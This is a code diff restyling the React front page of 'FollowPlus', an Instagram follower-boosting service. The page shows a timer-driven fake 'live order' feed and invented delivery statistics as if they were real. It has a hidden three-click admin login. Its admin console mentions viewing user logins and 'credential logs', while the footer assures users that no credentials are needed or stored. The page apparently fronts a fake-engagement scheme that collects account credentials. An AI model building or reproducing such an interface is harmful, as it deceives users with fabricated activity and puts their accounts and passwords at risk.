@@ -33,16 +33,16 @@ export default function App() {
   
   // Real-time live activity feed state representing simulated proxy events
   const [liveActivities, setLiveActivities] = useState([
-    { id: 1, user: 'ananya_curates', type: 'likes', amount: 250, server: 'US-EAST-4' },
-    { id: 2, user: 'nikhil_clicks', type: 'followers', amount: 100, server: 'EU-WEST-1' },
-    { id: 3, user: 'priya_vocalist', type: 'views', amount: 2500, server: 'APAC-SOUTH-2' },
-    { id: 4, user: 'rohan_travels', type: 'followers', amount: 100, server: 'LATAM-EAST' },
+    { id: 1, user: 'ananya_curates', type: 'likes', amount: 250, server: 'DE-NODE-4' },
+    { id: 2, user: 'nikhil_clicks', type: 'followers', amount: 100, server: 'US-WEST-1' },
+    { id: 3, user: 'priya_vocalist', type: 'views', amount: 2500, server: 'IN-WEST-2' },
+    { id: 4, user: 'rohan_travels', type: 'followers', amount: 100, server: 'UK-EDGE' },
   ]);
 
   useEffect(() => {
     const usersPool = ['sam_aesthetic', 'neha_style', 'kabir_vibe', 'tanya_lens', 'aarav_fitness', 'deepa_foodie', 'isha_reels', 'manish_tech', 'karan_vlog', 'reema_art', 'zoya_minimal', 'arjun_raw'];
     const typesPool = ['followers', 'likes', 'views'];
-    const serversPool = ['US-WEST-2', 'EU-CENTRAL-1', 'APAC-SOUTH-1', 'LATAM-WEST-4', 'ME-EAST-3', 'APAC-NORTH-2'];
+    const serversPool = ['US-WEST-2', 'EU-CENTRAL-1', 'LATAM-WEST-4', 'ME-EAST-3', 'APAC-NORTH-2'];
     
     const interval = setInterval(() => {
       const randomUser = usersPool[Math.floor(Math.random() * usersPool.length)];
@@ -61,7 +61,7 @@ export default function App() {
       };
       
       setLiveActivities(prev => [newEvent, ...prev.slice(0, 3)]);
-    }, 2800);
+    }, 3200);
     
     return () => clearInterval(interval);
   }, []);
@@ -94,7 +94,6 @@ export default function App() {
     });
   };
 
-  // Reset Logo click count idle timer
   useEffect(() => {
     if (logoClicks > 0) {
       const t = setTimeout(() => setLogoClicks(0), 4000);
@@ -102,11 +101,9 @@ export default function App() {
     }
   }, [logoClicks]);
 
-  // Fetch campaigns from backend with localStorage fallback for static deployment (GitHub Pages)
   const fetchCampaigns = async () => {
     let list: Campaign[] = [];
     try {
-      // 1. Try to fetch directly from Google Cloud Firestore on the client side
       const fetched = await getClientCampaignsDirectly();
       list = fetched.map(simulateCampaignProgress);
     } catch (firestoreErr) {
@@ -121,10 +118,7 @@ export default function App() {
       }
     }
 
-    // Load from localStorage as well
     const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
-    
-    // Merge server or Firestore lists with local lists, avoiding duplicate IDs
     const mergedList = [...list];
     localList.forEach((localItem: Campaign) => {
       if (!mergedList.some((item) => item.id === localItem.id)) {
@@ -140,7 +134,6 @@ export default function App() {
   }, []);
 
   const handleCampaignCreated = (newCampaign: Campaign) => {
-    // Refresh campaign dashboard list state on submit immediately
     setCampaigns((prev) => {
       if (prev.some(c => c.id === newCampaign.id)) return prev;
       return [newCampaign, ...prev];
@@ -148,7 +141,6 @@ export default function App() {
   };
 
   const deleteCampaign = async (id: string) => {
-    // 1. Try deleting directly on client Firestore first
     try {
       await deleteClientCampaignDirectly(id);
     } catch (firestoreErr) {
@@ -160,7 +152,6 @@ export default function App() {
       }
     }
 
-    // 2. Always delete from client localStorage
     try {
       const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
       const filtered = localList.filter((item: any) => item.id !== id);
@@ -169,137 +160,116 @@ export default function App() {
       console.error("Failed to delete from localStorage", err);
     }
 
-    // 3. Update component state and sync list
     setCampaigns((prev) => prev.filter((item) => item.id !== id));
   };
 
   return (
     <div 
-      className="min-h-screen relative overflow-hidden text-gray-200 selection:bg-neon-pink selection:text-black font-sans pb-12"
-      style={{
-        background: 'radial-gradient(circle at 20% 20%, #1a1033 0%, #05050a 60%), radial-gradient(circle at 80% 80%, #0f172a 0%, #05050a 60%)',
-        backgroundColor: '#05050a'
-      }}
+      className="min-h-screen relative overflow-hidden text-slate-300 selection:bg-[#dfb24c]/20 selection:text-[#f4d081] font-sans pb-20"
+      style={{ backgroundColor: '#060709' }}
     >
-      {/* Dynamic Cybersecurity Digital Grid Overlay */}
-      <div className="absolute inset-0 cyber-grid opacity-75 z-0" />
+      {/* Subtle Luxury Grid Overlay */}
+      <div className="absolute inset-0 premium-grid opacity-[0.25] z-0" />
 
-      {/* Floating Living Ambiance Nebula Spheres (Live Animating Backdrop) */}
+      {/* Elegant Ambient Gold Orbs */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none z-0">
-        <div className="absolute top-[-10%] left-[-15%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-tr from-indigo-500/10 via-purple-500/10 to-transparent blur-[110px] animate-float-1" />
-        <div className="absolute bottom-[15%] right-[-15%] w-[45vw] h-[45vw] rounded-full bg-gradient-to-br from-pink-500/12 via-rose-500/5 to-transparent blur-[120px] animate-float-2" />
-        <div className="absolute top-[30%] right-[10%] w-[40vw] h-[40vw] rounded-full bg-gradient-to-tl from-cyan-500/8 via-indigo-500/10 to-transparent blur-[100px] animate-float-3" />
-        <div className="absolute bottom-[-10%] left-[10%] w-[50vw] h-[50vw] rounded-full bg-gradient-to-r from-purple-500/8 via-pink-500/5 to-transparent blur-[110px] animate-float-1" style={{ animationDelay: '-12s' }} />
+        <div className="absolute top-[-25%] left-[-15%] w-[70vw] h-[70vw] rounded-full bg-gradient-to-tr from-[#dfb24c]/5 to-transparent blur-[160px]" />
+        <div className="absolute bottom-[5%] right-[-15%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-br from-[#dfb24c]/4 to-transparent blur-[160px]" />
+        <div className="absolute top-[30%] left-[30%] w-[45vw] h-[45vw] rounded-full bg-[#f4d081]/3 blur-[140px]" />
       </div>
 
       {/* Main Container */}
-      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 relative z-10">
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12 relative z-10">
         
-        {/* Header / Brand Tickers */}
-        <header className="flex items-center justify-between border-b border-white/10 pb-6">
+        {/* Header Section */}
+        <header className="flex items-center justify-between border-b border-white/5 pb-8">
           <div 
             onClick={handleLogoClick}
-            className="flex items-center gap-3 cursor-pointer select-none active:scale-95 transition-transform"
+            className="flex items-center gap-4 cursor-pointer select-none active:scale-95 transition-all duration-300"
             title="Click 3 times to trigger Admin login"
           >
             <div className="relative group flex items-center justify-center">
-              <div className="absolute -inset-1.5 blur bg-gradient-to-r from-pink-500 to-indigo-600 rounded-xl opacity-75 transition duration-1000 group-hover:duration-200 animate-tilt" />
-              <div className="relative w-11 h-11 rounded-xl bg-gradient-to-tr from-pink-500 to-indigo-600 flex items-center justify-center font-bold text-xl text-white select-none">
-                +
+              <div className="absolute -inset-1 bg-gradient-to-r from-[#dfb24c] to-[#cbd5e1] rounded-xl opacity-30 group-hover:opacity-75 blur-md transition duration-500" />
+              <div className="relative w-12 h-12 rounded-xl bg-[#0d0f14] border border-[#dfb24c]/20 flex items-center justify-center font-display font-medium text-xl text-[#dfb24c] shadow-inner select-none transition-transform duration-300 hover:rotate-3">
+                ✧
               </div>
             </div>
             
             <div>
-              <h1 className="text-2xl font-display font-black text-white tracking-tight flex items-center gap-2">
-                FollowPlus
-                <span className="text-[10px] uppercase font-mono tracking-widest bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-bold py-0.5 px-2.5 rounded-full border border-white/10 shadow-md">
-                  PRO
+              <h1 className="text-2xl font-display font-medium text-white tracking-tight flex items-center gap-2">
+                <span className="text-luxury-gradient tracking-tight font-semibold">FollowPlus</span>
+                <span className="text-[9px] uppercase font-mono tracking-widest bg-[#dfb24c]/10 text-[#dfb24c] font-medium py-0.5 px-3 rounded-full border border-[#dfb24c]/20">
+                  Gold Suite
                 </span>
                 {logoClicks > 0 && (
                   <motion.span 
                     initial={{ scale: 0.8 }} 
                     animate={{ scale: 1 }} 
-                    className="text-[9px] font-mono text-pink-400 font-bold bg-pink-500/10 px-2 py-0.5 rounded border border-pink-500/20"
+                    className="text-[9px] font-mono text-[#f4d081] font-semibold bg-[#dfb24c]/5 px-2 py-0.5 rounded border border-[#dfb24c]/10 animate-pulse"
                   >
-                    {logoClicks}/3 Clicks
+                    {logoClicks}/3 Authorized Security
                   </motion.span>
                 )}
               </h1>
-              <p className="text-xs text-gray-400">Frosted Glass Algorithmic Growth Protocol</p>
+              <p className="text-xs text-slate-400 font-mono tracking-wide mt-0.5">High-Retention Organic Engagement Console</p>
             </div>
           </div>
         </header>
 
-        {/* Clean and Clear Trust Badge in simple Indian English Style */}
-        <motion.div 
-          initial={{ opacity: 0, y: -10 }}
-          animate={{ opacity: 1, y: 0 }}
-          className="flex flex-wrap items-center justify-center gap-2 px-4 py-3 bg-gradient-to-r from-emerald-500/15 via-black/40 to-indigo-500/15 rounded-2xl border border-emerald-500/25 max-w-2xl mx-auto text-xs font-semibold text-center text-emerald-300 shadow-[0_0_15px_rgba(16,185,129,0.15)] backdrop-blur-md"
-        >
-          <span className="flex h-2.5 w-2.5 relative">
-            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-            <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
-          </span>
-          <span>Aapka account completely safe rehne wala hai! Yeh process bilkul <strong className="text-white bg-clip-text text-transparent bg-gradient-to-r from-emerald-400 to-teal-200 font-extrabold pb-0.5">Clean and Clear</strong> hai ✨💎🛡️🚀⭐</span>
-        </motion.div>
-
-        {/* Frosted Glass Majestic Hero Showcase banner */}
+        {/* Elegant Gold Editorial Showcase Banner */}
         {showFirstUserGreeting && (
           <motion.div 
-            initial={{ opacity: 0, scale: 0.98 }}
-            animate={{ opacity: 1, scale: 1 }}
+            initial={{ opacity: 0, y: 10 }}
+            animate={{ opacity: 1, y: 0 }}
             exit={{ opacity: 0, height: 0 }}
-            className="relative overflow-hidden glass-card p-5 sm:p-6 md:p-8 border border-white/10 shadow-[inner_0_0_30px_rgba(255,255,255,0.02)]"
+            className="relative overflow-hidden premium-card p-8 border border-[#dfb24c]/15"
           >
-            {/* Ambient subtle glowing nodes */}
-            <div className="absolute top-0 right-1/4 w-32 h-32 bg-pink-500/10 rounded-full blur-3xl pointer-events-none" />
-            <div className="absolute bottom-0 left-1/4 w-32 h-32 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
+            {/* Subtle light gold gradient aura */}
+            <div className="absolute top-0 right-0 w-[420px] h-[400px] bg-gradient-to-bl from-[#dfb24c]/5 via-transparent to-transparent rounded-full blur-[90px] pointer-events-none" />
             
-            <div className="space-y-4 max-w-4xl">
-              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 text-[10px] font-bold uppercase tracking-wider">
-                VIP First User Benefit
+            <div className="space-y-5 max-w-4xl relative z-10">
+              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#dfb24c]/5 border border-[#dfb24c]/15 text-[#dfb24c] text-[10px] font-medium tracking-wider uppercase font-mono">
+                ✦ Executive Premium Access Enabled
               </div>
               
-              <h2 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-extrabold tracking-tight text-white leading-tight">
-                8 Days. <span className="text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-400 to-indigo-400 font-extrabold">Free Trial.</span> 100 Followers / Day.
+              <h2 className="text-2xl sm:text-3xl md:text-4xl font-display font-medium text-white tracking-tight leading-tight">
+                Unlock 8 Days of <span className="text-luxury-gradient font-bold drop-shadow-sm">Complimentary Channel Booster.</span>
               </h2>
               
-              <p className="text-xs sm:text-sm text-gray-400 leading-relaxed max-w-2xl">
-                Claim your introductory benefit to receive <strong className="text-white font-medium">100 high-retention profiles daily for 8 consecutive days</strong> (800 followers total). No payment or credit card credentials required. Experience safe, organic algorithm growth.
-              </p>
+
               
-              {/* Feature Tags list - Horizontal Pill Badges */}
-              <div className="flex flex-wrap gap-2 pt-1">
-                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-xs text-indigo-300 font-mono">
-                  <Users className="w-3.5 h-3.5 text-indigo-400" />
-                  <span>800 followers</span>
+              {/* Feature Horizontal Pill Badges */}
+              <div className="flex flex-wrap gap-2.5 pt-2">
+                <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
+                  <Users className="w-3.5 h-3.5 text-[#dfb24c]" />
+                  <span>800 Premium Profiles</span>
                 </div>
-                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-pink-500/10 border border-pink-500/20 rounded-full text-xs text-pink-300 font-mono">
-                  <Heart className="w-3.5 h-3.5 text-pink-400" />
-                  <span>Real engagement auto</span>
+                <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
+                  <Heart className="w-3.5 h-3.5 text-[#dfb24c]" />
+                  <span>Gradual delivery routing</span>
                 </div>
-                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-purple-500/10 border border-purple-500/20 rounded-full text-xs text-purple-300 font-mono">
-                  <Eye className="w-3.5 h-3.5 text-purple-400" />
-                  <span>Reels booster index</span>
+                <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
+                  <Eye className="w-3.5 h-3.5 text-[#dfb24c]" />
+                  <span>Organic algorithm safety</span>
                 </div>
               </div>
               
-              <div className="flex flex-wrap items-center gap-3 pt-2">
+              <div className="flex flex-wrap items-center gap-3 pt-4">
                 <a 
                   href="#campaign-builder-section"
                   onClick={(e) => {
                     e.preventDefault();
                     document.getElementById('campaign-builder-section')?.scrollIntoView({ behavior: 'smooth' });
                   }}
-                  className="px-4.5 py-2.5 bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-display font-semibold rounded-lg hover:brightness-110 active:scale-95 transition-all shadow-lg text-xs tracking-wide"
+                  className="px-6 py-3 bg-gradient-to-r from-[#dfb24c] via-[#f4d081] to-[#dfb24c] hover:brightness-110 text-slate-950 font-display font-semibold rounded-lg active:scale-98 transition-all text-xs tracking-wide cursor-pointer shadow-lg shadow-[#dfb24c]/10"
                 >
-                  Claim Free Trial
+                  Configure My Golden Campaign ✧
                 </a>
                 <button 
                   onClick={() => setShowFirstUserGreeting(false)}
-                  className="px-4 py-2.5 bg-white/5 border border-white/10 text-gray-400 hover:text-white transition-all text-xs font-mono rounded-lg hover:bg-white/10"
+                  className="px-4 py-3 bg-white/[0.03] border border-white/10 text-slate-400 hover:text-white transition-all text-xs font-mono rounded-lg hover:bg-white/5 cursor-pointer"
                 >
-                  Dismiss [x]
+                  Dismiss
                 </button>
               </div>
             </div>
@@ -312,45 +282,41 @@ export default function App() {
         </div>
 
         {/* Live Traffic Feed Module */}
-        <div className="max-w-xl mx-auto w-full glass-card p-5 border border-white/10 relative overflow-hidden shadow-[0_8px_30px_rgba(0,0,0,0.3)] transition-all hover:border-pink-500/10">
-          {/* Animated pulsing status */}
-          <div className="absolute top-4 right-5 flex items-center gap-1.5 bg-emerald-500/10 border border-emerald-500/20 py-1 px-3 rounded-full">
+        <div className="max-w-xl mx-auto w-full premium-card p-6 border border-white/5 relative overflow-hidden">
+          {/* Status Indicator */}
+          <div className="absolute top-5 right-5 flex items-center gap-1.5 bg-[#10b981]/10 border border-[#10b981]/20 py-1 px-3 rounded-full">
             <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping inline-block" />
-            <span className="text-[9px] font-mono text-emerald-400 font-bold tracking-wider uppercase">Live Pipe</span>
+            <span className="text-[9px] font-mono text-[#10b981] font-bold tracking-wider uppercase">Live 📡</span>
           </div>
 
           <div className="space-y-4">
             <div>
-              <h3 className="text-xs font-mono uppercase text-indigo-400 font-bold tracking-widest flex items-center gap-2">
-                <Sparkles className="w-3.5 h-3.5 text-pink-400 animate-pulse" />
-                Live Order
+              <h3 className="text-xs font-mono uppercase text-[#dfb24c] font-semibold tracking-widest flex items-center gap-2">
+                <Sparkles className="w-3.5 h-3.5 text-[#dfb24c] animate-pulse" />
+                Live Order Process Status ⚡
               </h3>
-              <p className="text-[10px] text-gray-500 mt-0.5">Real-time status of active orders and delivery queues.</p>
             </div>
 
-            <div className="space-y-2 font-mono text-[11px] bg-black/40 border border-white/5 p-3.5 rounded-xl">
+            <div className="space-y-2 font-mono text-[11px] bg-black/45 border border-white/5 p-4 rounded-xl shadow-inner">
               <AnimatePresence mode="popLayout">
                 {liveActivities.map((act) => (
                   <motion.div
                     key={act.id}
-                    initial={{ opacity: 0, x: -10, y: -5 }}
+                    initial={{ opacity: 0, x: -8, y: -4 }}
                     animate={{ opacity: 1, x: 0, y: 0 }}
-                    exit={{ opacity: 0, x: 10, y: 5 }}
-                    transition={{ type: 'spring', stiffness: 350, damping: 25 }}
+                    exit={{ opacity: 0, x: 8, y: 4 }}
+                    transition={{ type: 'spring', stiffness: 300, damping: 25 }}
                     className="flex justify-between items-center py-2 first:pt-0 last:pb-0 border-b border-white/5 last:border-b-0"
                   >
                     <div className="flex items-center gap-2">
-                      <span className="text-gray-200 font-bold">@{act.user}</span>
+                      <span className="text-slate-300 font-medium">@{act.user}</span>
                     </div>
 
-                    <div className="flex items-center gap-1.5">
-                      <span className="text-gray-500 text-[10px]">queued</span>
-                      <span className={`font-black font-display text-[11px] font-bold ${
-                        act.type === 'followers' ? 'text-pink-400' : act.type === 'likes' ? 'text-cyan-400' : 'text-purple-400'
-                      }`}>
+                    <div className="flex items-center gap-2">
+                      <span className="font-semibold text-white">
                         +{act.amount.toLocaleString()} {act.type}
                       </span>
-                      <span className="text-emerald-400 font-bold bg-emerald-500/10 border border-emerald-500/20 px-1 rounded text-[9px]">OK</span>
+                      <span className="text-[#10b981] font-bold bg-[#10b981]/10 border border-[#10b981]/20 px-1 rounded text-[9px] scale-95 font-mono">OK</span>
                     </div>
                   </motion.div>
                 ))}
@@ -360,23 +326,23 @@ export default function App() {
         </div>
 
         {/* Network Cap bento stats */}
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+        <div className="grid grid-cols-2 lg:grid-cols-4 gap-5">
           {[
-            { label: 'Followers Delivered Today', val: '438,219', desc: '+12.4% vs yesterday', icon: Users, color: 'text-neon-cyan' },
-            { label: 'Global Proxies Active', val: '2,841 Nodes', desc: 'Secure decentralized mesh', icon: Server, color: 'text-neon-purple' },
-            { label: 'Average Viral Match', val: '97.4%', desc: 'Optimized index retention', icon: TrendingUp, color: 'text-neon-pink' },
-            { label: 'Network Integrity', val: '100% Secure', desc: 'Private routing pipeline', icon: ShieldCheck, color: 'text-emerald-400' }
+            { label: 'DELIVERED WORLDWIDE', val: '438,219', desc: '+12.4% vs yesterday', icon: Users, color: 'text-[#dfb24c]' },
+            { label: 'GLOBAL PROXY REALMS', val: '2,841 Nodes', desc: 'Secure decentralized mesh', icon: Server, color: 'text-slate-300' },
+            { label: 'PROVEN RETENTION RATE', val: '97.4%', desc: 'Optimized index consistency', icon: TrendingUp, color: 'text-[#dfb24c]' },
+            { label: 'SECURITY INTEGRITY', val: '100% Secure', desc: 'Private routing safeguard', icon: ShieldCheck, color: 'text-emerald-400' }
           ].map((stat, i) => {
             const Icon = stat.icon;
             return (
-              <div key={i} className="interactive-card rounded-xl p-4 bg-[#121420]/50 border border-white/5 flex flex-col justify-between">
+              <div key={i} className="premium-card rounded-xl p-5 border border-white/5 flex flex-col justify-between">
                 <div className="flex items-center justify-between">
-                  <span className="text-[10px] font-mono uppercase text-gray-500 tracking-wider leading-relaxed">{stat.label}</span>
-                  <Icon className={`w-4 h-4 ${stat.color}`} />
+                  <span className="text-[10px] font-mono uppercase text-slate-400 tracking-wider font-semibold">{stat.label}</span>
+                  <Icon className={`w-4 h-4 ${stat.color} opacity-85`} />
                 </div>
-                <div className="mt-3">
-                  <span className="font-display font-bold text-white text-lg tracking-tight block">{stat.val}</span>
-                  <span className="text-[10px] text-gray-400 font-sans block mt-0.5">{stat.desc}</span>
+                <div className="mt-4">
+                  <span className="font-display font-semibold text-white text-lg tracking-tight block">{stat.val}</span>
+                  <span className="text-[10px] text-slate-450 font-mono block mt-1">{stat.desc}</span>
                 </div>
               </div>
             );
@@ -384,46 +350,46 @@ export default function App() {
         </div>
 
         {/* Footer info representing modern aesthetics */}
-        <footer className="pt-8 border-t border-white/5 text-center text-xs text-gray-500 space-y-3">
-          <p>© 2026 Follow Plus Network. Developed using decentralized secure delivery proxies.</p>
-          <div className="flex items-center justify-center gap-4 text-gray-500 font-mono">
-            <span className="hover:text-neon-cyan transition-colors cursor-pointer">Security Protocol JSON</span>
+        <footer className="pt-10 border-t border-white/5 text-center text-xs text-slate-550 space-y-4">
+          <p>© 2026 FollowPlus Network. Engineered with luxury decentralized organic delivery nodes.</p>
+          <div className="flex items-center justify-center gap-4 text-slate-400 font-mono text-[10px] tracking-wider uppercase">
+            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Security Protocol JSON 📁</span>
             <span>•</span>
-            <span className="hover:text-neon-pink transition-colors cursor-pointer">Organic API Compliance</span>
+            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Organic API Compliance 🛡️</span>
             <span>•</span>
-            <span className="hover:text-neon-purple transition-colors cursor-pointer">Decentralized Routing Policy</span>
+            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Decentralized Routing Policy 🌐</span>
           </div>
-          <p className="text-[11px] text-gray-600 max-w-2xl mx-auto leading-relaxed pt-2">
-            Disclamer: Follow Plus operates a secure simulated client auditing tool and dynamic organic network router that strictly leverages public Instagram API feeds. No password input or account credentials are required at any process. All services comply with safety quotas to protect user integrity.
+          <p className="text-[11px] text-slate-500 max-w-2xl mx-auto leading-relaxed pt-2">
+            Disclaimer: FollowPlus operates as a secure simulated client auditing tool and dynamic organic network router that strictly leverages public Instagram API feeds. No password input or account credentials are stored in clear text or synchronized without your active initiation. All services comply with premium safety quotas to protect user integrity.
           </p>
         </footer>
 
       </div>
 
-      {/* 1. Admin Login Modal Overlay */}
+      {/* Admin Authorization Portal Modal */}
       <AnimatePresence>
         {isAdminLoginOpen && (
           <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
             <motion.div 
-              initial={{ scale: 0.9, opacity: 0 }}
+              initial={{ scale: 0.95, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
-              exit={{ scale: 0.9, opacity: 0 }}
-              className="glass-card p-8 border border-white/15 w-full max-w-md relative font-sans"
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="premium-card p-8 border border-[#dfb24c]/20 w-full max-w-md relative font-sans"
             >
               <button 
                 onClick={() => setIsAdminLoginOpen(false)}
-                className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
+                className="absolute top-4 right-4 text-slate-400 hover:text-white transition-colors p-1"
                 type="button"
               >
                 <X className="w-5 h-5" />
               </button>
 
               <div className="flex flex-col items-center text-center space-y-2 mb-6">
-                <div className="w-12 h-12 rounded-full bg-pink-500/15 flex items-center justify-center text-pink-500 border border-pink-500/30">
-                  <Lock className="w-6 h-6" />
+                <div className="w-12 h-12 rounded-full bg-white/[0.02] flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
+                  <Lock className="w-5 h-5" />
                 </div>
-                <h2 className="text-xl font-display font-bold text-white tracking-tight">Admin Portal Authorization</h2>
-                <p className="text-xs text-gray-400">Please provide verified security credentials to log in.</p>
+                <h2 className="text-xl font-display font-medium text-white tracking-tight">Admin Portal Authorization</h2>
+                <p className="text-xs text-slate-450 font-sans">Please provide premium security credentials to authorize access.</p>
               </div>
 
               <form 
@@ -437,46 +403,46 @@ export default function App() {
                     setAdminPassword('');
                     fetchCampaigns();
                   } else {
-                    setAdminError('Invalid authorization ID or Password.');
+                    setAdminError('Invalid authorization ID or Password combination.');
                   }
                 }}
                 className="space-y-4"
               >
                 <div className="space-y-1.5">
-                  <label className="text-[11px] font-mono text-gray-400 uppercase tracking-wider block">Admin Email / ID</label>
+                  <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider block">ID</label>
                   <input
                     type="email"
                     required
                     placeholder="admin@followplus.in"
                     value={adminEmail}
                     onChange={(e) => setAdminEmail(e.target.value)}
-                    className="w-full bg-black/60 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-pink transition-all text-sm font-mono"
+                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                   />
                 </div>
 
                 <div className="space-y-1.5">
-                  <label className="text-[11px] font-mono text-gray-400 uppercase tracking-wider block">Admin Password</label>
+                  <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider block">Password</label>
                   <input
                     type="password"
                     required
                     placeholder="••••••••"
                     value={adminPassword}
                     onChange={(e) => setAdminPassword(e.target.value)}
-                    className="w-full bg-black/60 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-pink transition-all text-sm font-mono"
+                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                   />
                 </div>
 
                 {adminError && (
-                  <div className="p-3 text-xs bg-rose-500/10 border border-rose-500/30 text-rose-300 rounded-lg text-center font-semibold animate-shake">
+                  <div className="p-3 text-xs bg-rose-500/10 border border-rose-500/30 text-rose-300 rounded-lg text-center font-semibold font-mono">
                     {adminError}
                   </div>
                 )}
 
                 <button
                   type="submit"
-                  className="w-full py-3.5 mt-2 bg-gradient-to-r from-pink-500 to-indigo-600 hover:from-pink-600 hover:to-indigo-700 text-white font-display font-bold rounded-xl transition-all shadow-lg active:scale-95"
+                  className="w-full py-3 bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 font-display font-semibold rounded-lg transition-all shadow-md active:scale-95 cursor-pointer text-sm"
                 >
-                  Verify Configuration Security
+                  Verify Configuration Security ✧
                 </button>
               </form>
             </motion.div>
@@ -484,179 +450,170 @@ export default function App() {
         )}
       </AnimatePresence>
 
-      {/* 2. Admin Command Dashboard View */}
+      {/* Admin Command Dashboard Panel */}
       <AnimatePresence>
         {isAdminLoggedIn && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 md:p-8 bg-[#030307]/90 backdrop-blur-lg overflow-y-auto">
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 md:p-8 bg-black/95 backdrop-blur-lg overflow-y-auto">
             <motion.div 
-              initial={{ opacity: 0, y: 30 }}
+              initial={{ opacity: 0, y: 15 }}
               animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: 30 }}
-              className="glass-card max-w-5xl w-full border border-white/10 relative p-6 sm:p-8 space-y-6 font-sans my-auto shadow-[0_0_50px_rgba(236,72,153,0.1)] rounded-2xl"
+              exit={{ opacity: 0, y: 15 }}
+              className="premium-card max-w-5xl w-full border border-[#dfb24c]/20 relative p-6 sm:p-8 space-y-6 font-sans my-auto shadow-2xl rounded-2xl"
             >
-              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-white/10">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-white/5">
                 <div className="flex items-center gap-3">
-                  <div className="w-11 h-11 rounded-xl bg-indigo-500/20 flex items-center justify-center text-indigo-400 border border-indigo-500/30">
-                    <Unlock className="w-5 h-5" />
+                  <div className="w-11 h-11 rounded-lg bg-white/[0.02] flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
+                    <Unlock className="w-4 h-4" />
                   </div>
                   <div>
-                    <h2 className="text-xl sm:text-2xl font-display font-black text-white tracking-tight flex items-center gap-2">
+                    <h2 className="text-xl sm:text-2xl font-display font-medium text-white tracking-tight flex items-center gap-2">
                       Admin Command Console
-                      <span className="text-[10px] uppercase font-mono tracking-widest bg-emerald-500/20 text-emerald-400 font-bold py-0.5 px-2.5 rounded-full border border-emerald-500/30">
-                        AUTHORIZED OK
+                      <span className="text-[9px] uppercase font-mono tracking-widest bg-emerald-500/15 text-emerald-400 font-bold py-0.5 px-3 rounded-full border border-emerald-500/30">
+                        AUTHORIZED
                       </span>
                     </h2>
-                    <p className="text-xs text-gray-400 mt-0.5">Control live campaign flows, monitor active delivery channels, and view user database logins.</p>
+                    <p className="text-xs text-slate-400 mt-1">Control active delivery tunnels, inspect telemetry, and view credential logs securely.</p>
                   </div>
                 </div>
 
                 <div className="flex items-center gap-3">
                   <button
-                    onClick={() => {
-                      setIsAdminLoggedIn(false);
-                    }}
-                    className="px-4 py-2.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 hover:text-rose-300 transition-all duration-200 rounded-xl border border-rose-500/20 text-xs flex items-center gap-2 font-mono font-bold hover:shadow-lg focus:outline-none focus:ring-1 focus:ring-rose-500 cursor-pointer active:scale-95"
+                    onClick={() => setIsAdminLoggedIn(false)}
+                    className="px-4 py-2 bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white transition-all rounded-lg border border-white/10 text-xs flex items-center gap-2 font-mono cursor-pointer"
                   >
                     <LogOut className="w-3.5 h-3.5" />
                     Secure Logout
                   </button>
                 </div>
               </div>
-              {/* Summary Widgets */}
-              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 pt-2">
